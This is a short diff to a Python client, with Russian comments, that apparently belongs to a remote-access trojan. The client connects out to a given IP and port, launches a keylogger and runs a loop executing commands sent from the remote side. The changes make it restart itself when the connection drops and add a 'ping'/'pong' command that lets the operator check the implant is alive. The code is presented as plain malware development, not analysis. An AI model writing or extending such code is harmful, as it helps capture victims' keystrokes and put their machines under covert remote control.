@@ -39,7 +39,7 @@ class Client:
                 pass
             except Exception:
                 print("Подключение зарыто переход в режим ожидания")
-                return
+                restarter(self)
 
 
     def __init__(self, ip, port):
@@ -53,6 +53,7 @@ class Client:
             except socket.error:
                 time.sleep(5)
             else:
+                print("подключен")
                 break
         # запуск кейлоггера
         self.keylogger = key_logger.KeyLogger()
@@ -104,6 +105,8 @@ class Client:
             command = self.receive_json()
             try:
                 match command[0]:
+                    case "ping":
+                         command_response = "pong"
                     case "exit":
                         self.connection.close()
                         sys.exit()
